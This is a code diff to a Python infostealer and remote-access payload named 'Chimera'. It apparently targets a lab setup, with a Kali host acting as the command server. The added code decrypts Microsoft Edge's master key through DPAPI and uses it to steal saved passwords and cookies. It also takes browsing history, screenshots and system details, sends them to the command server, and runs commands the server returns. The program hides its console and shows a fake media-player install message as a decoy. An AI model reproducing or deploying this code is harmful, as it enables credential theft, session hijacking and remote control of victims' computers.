@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-Chimera Malware - Final Payload
-Complete version with all modules
+Chimera Payload - Edge Fixed (Passwords + Cookies)
 """
 import os
 import sys
@@ -14,19 +13,13 @@ import urllib.error
 import ctypes
 import base64
 import platform
-import threading
+import sqlite3
+import shutil
+import re
 from datetime import datetime
-
-# ============================================
-# CONFIGURATION
-# ============================================
 
 KALI_IP = "10.0.2.20"
 C2_URL = f"http://{KALI_IP}:8080"
-
-# ============================================
-# HELPERS
-# ============================================
 
 def get_local_ip():
     try:
@@ -70,9 +63,18 @@ def log(msg):
     except:
         pass
 
-# ============================================
-# SYSTEM INFO
-# ============================================
+def send_to_c2(endpoint, data):
+    try:
+        req = urllib.request.Request(
+            f"{C2_URL}{endpoint}",
+            data=json.dumps(data, default=str).encode('utf-8'),
+            headers={'Content-Type': 'application/json'}
+        )
+        response = urllib.request.urlopen(req, timeout=15)
+        return True
+    except Exception as e:
+        log(f"Send error: {e}")
+        return False
 
 def get_system_info():
     info = {
@@ -111,42 +113,266 @@ def get_system_info():
     
     return info
 
-# ============================================
-# SCREENSHOT
-# ============================================
-
 def capture_screenshot():
     try:
         from PIL import ImageGrab
         import io
+        log("📸 Capturing screenshot...")
         screenshot = ImageGrab.grab(all_screens=True)
         buffered = io.BytesIO()
         screenshot.save(buffered, format="PNG")
-        return base64.b64encode(buffered.getvalue()).decode('utf-8')
+        img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
+        log(f"✅ Screenshot: {len(buffered.getvalue())} bytes")
+        return img_base64
     except Exception as e:
         log(f"Screenshot error: {e}")
         return None
 
 # ============================================
-# SEND TO C2
+# EDGE PASSWORDS (FIXED)
 # ============================================
 
-def send_to_c2(endpoint, data):
+def get_edge_master_key():
+    """Get Edge master key for decryption"""
     try:
-        req = urllib.request.Request(
-            f"{C2_URL}{endpoint}",
-            data=json.dumps(data).encode('utf-8'),
-            headers={'Content-Type': 'application/json'}
-        )
-        response = urllib.request.urlopen(req, timeout=10)
-        return True
+        import win32crypt
+        
+        local_state_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State")
+        if not os.path.exists(local_state_path):
+            log("Edge Local State not found")
+            return None
+        
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.load(f)
+        
+        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+        
+        # Decrypt with DPAPI
+        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        log("✅ Edge master key retrieved")
+        return master_key
     except Exception as e:
-        log(f"Send error: {e}")
-        return False
+        log(f"Master key error: {e}")
+        return None
+
+def decrypt_edge_data(encrypted_data, master_key):
+    """Decrypt Edge data using master key"""
+    try:
+        from Crypto.Cipher import AES
+        
+        if not master_key:
+            return None
+        
+        # Check if data is encrypted with v10/v11
+        if encrypted_data.startswith(b'v10') or encrypted_data.startswith(b'v11'):
+            encrypted_data = encrypted_data[3:]  # Remove version prefix
+            nonce = encrypted_data[3:15]
+            ciphertext = encrypted_data[15:-16]
+            tag = encrypted_data[-16:]
+            
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            return decrypted.decode('utf-8')
+        else:
+            # Try DPAPI fallback
+            import win32crypt
+            return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode('utf-8')
+    except Exception as e:
+        log(f"Decrypt error: {e}")
+        return None
+
+def get_edge_passwords():
+    """Get Edge saved passwords"""
+    passwords = []
+    
+    # First, get master key
+    master_key = get_edge_master_key()
+    if not master_key:
+        log("❌ Could not get master key")
+        return passwords
+    
+    edge_login_paths = [
+        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
+        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data")
+    ]
+    
+    for login_path in edge_login_paths:
+        if os.path.exists(login_path):
+            try:
+                # Copy file first (bypass lock)
+                temp_path = os.path.join(os.environ['TEMP'], 'edge_login_temp.db')
+                shutil.copy2(login_path, temp_path)
+                
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                
+                count = 0
+                for row in cursor.fetchall():
+                    url, username, enc_password = row
+                    if enc_password:
+                        password = decrypt_edge_data(enc_password, master_key)
+                        if password:
+                            passwords.append({
+                                "browser": "Edge",
+                                "url": url if url else "",
+                                "username": username if username else "",
+                                "password": password
+                            })
+                            count += 1
+                
+                conn.close()
+                os.remove(temp_path)
+                log(f"✅ Edge passwords: {count} found")
+                return passwords
+            except Exception as e:
+                log(f"Edge passwords error: {e}")
+                try:
+                    os.remove(temp_path)
+                except:
+                    pass
+    
+    return passwords
 
 # ============================================
-# REGISTER
+# EDGE COOKIES (FIXED)
 # ============================================
+
+def get_edge_cookies():
+    """Get Edge browser cookies"""
+    cookies = []
+    
+    # Get master key
+    master_key = get_edge_master_key()
+    if not master_key:
+        log("❌ Could not get master key for cookies")
+        return cookies
+    
+    edge_cookie_paths = [
+        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"),
+        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies")
+    ]
+    
+    for cookie_path in edge_cookie_paths:
+        if os.path.exists(cookie_path):
+            try:
+                temp_path = os.path.join(os.environ['TEMP'], 'edge_cookies_temp.db')
+                shutil.copy2(cookie_path, temp_path)
+                
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                
+                try:
+                    cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies LIMIT 200")
+                except:
+                    # Try without encrypted_value
+                    cursor.execute("SELECT host_key, name, value, path, expires_utc FROM cookies LIMIT 200")
+                    for row in cursor.fetchall():
+                        host_key, name, value, path, expires_utc = row
+                        if value:
+                            cookies.append({
+                                "browser": "Edge",
+                                "domain": host_key if host_key else "",
+                                "name": name if name else "",
+                                "value": value,
+                                "path": path if path else "/",
+                                "expires": str(expires_utc) if expires_utc else ""
+                            })
+                    conn.close()
+                    os.remove(temp_path)
+                    log(f"✅ Edge cookies (plain): {len(cookies)} found")
+                    return cookies
+                
+                count = 0
+                for row in cursor.fetchall():
+                    host_key, name, encrypted_value, path, expires_utc = row
+                    if encrypted_value:
+                        value = decrypt_edge_data(encrypted_value, master_key)
+                        if value:
+                            cookies.append({
+                                "browser": "Edge",
+                                "domain": host_key if host_key else "",
+                                "name": name if name else "",
+                                "value": value,
+                                "path": path if path else "/",
+                                "expires": str(expires_utc) if expires_utc else ""
+                            })
+                            count += 1
+                
+                conn.close()
+                os.remove(temp_path)
+                log(f"✅ Edge cookies: {count} found")
+                return cookies
+            except Exception as e:
+                log(f"Edge cookies error: {e}")
+                try:
+                    os.remove(temp_path)
+                except:
+                    pass
+    
+    return cookies
+
+# ============================================
+# EDGE HISTORY
+# ============================================
+
+def get_edge_history():
+    history = []
+    edge_paths = [
+        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"),
+        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\History")
+    ]
+    
+    for history_path in edge_paths:
+        if os.path.exists(history_path):
+            try:
+                temp_path = os.path.join(os.environ['TEMP'], 'edge_history_temp.db')
+                shutil.copy2(history_path, temp_path)
+                
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+                
+                for row in cursor.fetchall():
+                    url, title, timestamp = row
+                    history.append({
+                        "browser": "Edge",
+                        "url": url if url else "",
+                        "title": title if title else "",
+                        "timestamp": str(timestamp) if timestamp else ""
+                    })
+                
+                conn.close()
+                os.remove(temp_path)
+                log(f"✅ Edge history: {len(history)} entries")
+                return history
+            except Exception as e:
+                log(f"Edge history error: {e}")
+                try:
+                    os.remove(temp_path)
+                except:
+                    pass
+    
+    return history
+
+def get_browser_data():
+    """Get all browser data"""
+    data = {
+        "history": [],
+        "passwords": [],
+        "cookies": []
+    }
+    
+    log("📊 Collecting Edge data...")
+    
+    data["history"] = get_edge_history()
+    data["passwords"] = get_edge_passwords()
+    data["cookies"] = get_edge_cookies()
+    
+    log(f"📊 Summary - History: {len(data['history'])}, Passwords: {len(data['passwords'])}, Cookies: {len(data['cookies'])}")
+    
+    return data
 
 def register():
     info = get_system_info()
@@ -166,42 +392,30 @@ def register():
     }
     return send_to_c2("/api/register", data)
 
-# ============================================
-# SEND SYSTEM INFO
-# ============================================
-
 def send_system_info():
     info = get_system_info()
-    data = {
-        "victim_id": get_victim_id(),
-        "type": "system_info",
-        "content": info
-    }
+    data = {"victim_id": get_victim_id(), "type": "system_info", "content": info}
     return send_to_c2("/api/collect", data)
-
-# ============================================
-# SEND SCREENSHOT
-# ============================================
 
 def send_screenshot():
     img = capture_screenshot()
     if not img:
         return False
-    
     data = {
         "victim_id": get_victim_id(),
         "type": "screenshot",
-        "content": {
-            "image": img,
-            "size": len(img),
-            "timestamp": datetime.now().isoformat()
-        }
+        "content": {"image": img, "size": len(img), "timestamp": datetime.now().isoformat()}
     }
     return send_to_c2("/api/collect", data)
 
-# ============================================
-# EXECUTE COMMAND
-# ============================================
+def send_browser_data():
+    browser_data = get_browser_data()
+    data = {
+        "victim_id": get_victim_id(),
+        "type": "browser_data",
+        "content": browser_data
+    }
+    return send_to_c2("/api/collect", data)
 
 def execute_command(command):
     try:
@@ -219,10 +433,6 @@ def execute_command(command):
     except Exception as e:
         return f"[Error: {str(e)}]"
 
-# ============================================
-# GET COMMANDS
-# ============================================
-
 def get_commands():
     try:
         data = {"victim_id": get_victim_id()}
@@ -233,19 +443,12 @@ def get_commands():
         )
         response = urllib.request.urlopen(req, timeout=10)
         result = json.loads(response.read().decode())
-        
         if result.get('has_command'):
             command = result.get('command')
             command_id = result.get('command_id')
             log(f"Got command: {command}")
-            
             output = execute_command(command)
-            
-            result_data = {
-                "victim_id": get_victim_id(),
-                "command_id": command_id,
-                "result": output
-            }
+            result_data = {"victim_id": get_victim_id(), "command_id": command_id, "result": output}
             send_to_c2("/api/command_result", result_data)
             return True
         return False
@@ -253,79 +456,48 @@ def get_commands():
         log(f"Get commands error: {e}")
         return False
 
-# ============================================
-# KEYLOGGER (Optional)
-# ============================================
-
-def start_keylogger():
-    try:
-        from pynput import keyboard
-        log("Keylogger started")
-        return True
-    except:
-        return False
-
-# ============================================
-# MAIN
-# ============================================
-
 def main():
-    # Hide console
     try:
         ctypes.windll.kernel32.FreeConsole()
     except:
         pass
     
-    # Show fake message
     try:
-        ctypes.windll.user32.MessageBoxW(
-            0,
-            "Media Player Installation Complete!",
-            "CineVerse",
-            0
-        )
+        ctypes.windll.user32.MessageBoxW(0, "Media Player Installation Complete!", "CineVerse", 0)
     except:
         pass
     
     log("=" * 60)
-    log("Chimera Payload Started")
+    log("Chimera Payload - Edge Fixed Full")
     log(f"Victim ID: {get_victim_id()}")
-    log(f"IP: {get_local_ip()}")
+    log(f"Log File: {LOG_FILE}")
     log("=" * 60)
     
-    # Register
+    os.makedirs(os.environ.get('TEMP', 'C:\\Temp'), exist_ok=True)
+    
     register()
     time.sleep(1)
-    
-    # Send system info
     send_system_info()
     time.sleep(1)
-    
-    # Send screenshot
     send_screenshot()
     time.sleep(1)
+    send_browser_data()
     
-    # Start keylogger (optional)
-    start_keylogger()
+    log("✅ All data sent!")
     
-    # Main loop
     counter = 0
     while True:
         try:
             if counter % 5 == 0:
                 get_commands()
-            
             if counter % 30 == 0:
                 send_screenshot()
-            
             if counter % 60 == 0:
                 send_system_info()
-            
+            if counter % 120 == 0:
+                send_browser_data()
             time.sleep(1)
             counter += 1
-            
-        except KeyboardInterrupt:
-            break
         except Exception as e:
             log(f"Error: {e}")
             time.sleep(5)
